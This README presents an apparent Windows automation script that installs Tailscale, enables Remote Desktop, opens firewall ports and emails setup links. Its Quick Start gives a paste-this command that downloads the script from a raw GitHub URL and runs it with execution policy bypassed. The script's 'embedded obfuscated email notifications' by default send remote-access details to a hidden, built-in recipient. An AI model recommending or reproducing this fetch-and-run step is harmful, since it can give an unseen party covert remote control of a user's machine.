# Windows Tailscale & Remote Desktop Auto-Configurator

A secure and fully automated PowerShell deployment script designed for Windows 10 & 11 systems. It simplifies remote machine setup by performing silent Tailscale installation, automated CLI configuration, and secure Remote Desktop (RDP) enablement.

## Features

- **Admin Privilege Escalation:** Automatically elevates to Administrator privileges while forwarding script arguments.
- **Silent Tailscale Setup:** Downloads and silently installs the latest stable Tailscale MSI installer.
- **Dynamic Authentication:** Supports seamless automated deployment using a pre-configured Tailscale auth key (`-TailscaleAuthKey`) or interactive standard browser login.
- **Secure Credentials:** Integrates AES encrypted SMTP credentials for sending remote setup links through automated email, guaranteeing secrets are never stored in plaintext inside the repository.
- **Locale-Independent RDP Configuration:** Configures and enables the local Windows Remote Desktop service (`TermService`), automatically starts it, and opens the necessary host firewalls across all Windows language locales.

## Quick Start

### 1. Download & Execute

Open an elevated PowerShell prompt on the target Windows machine and run:

```powershell
Invoke-WebRequest `
  -Uri "https://raw.githubusercontent.com/waqarhossen/rmt/main/tailscale-setup.ps1" `
  -OutFile "tailscale-setup.ps1"

# Run the setup script (will run automatically with embedded obfuscated email notifications):
powershell -ExecutionPolicy Bypass -File ".\tailscale-setup.ps1"
```

### 2. Custom Parameters (Optional)

You can pass customizable parameters if you want to route notices to a different recipient or use pre-authenticated keys:

```powershell
powershell -ExecutionPolicy Bypass -File ".\tailscale-setup.ps1" `
  -TailscaleAuthKey "tskey-auth-yourKeyHere" `
  -ToEmail "recipient@example.com"
```
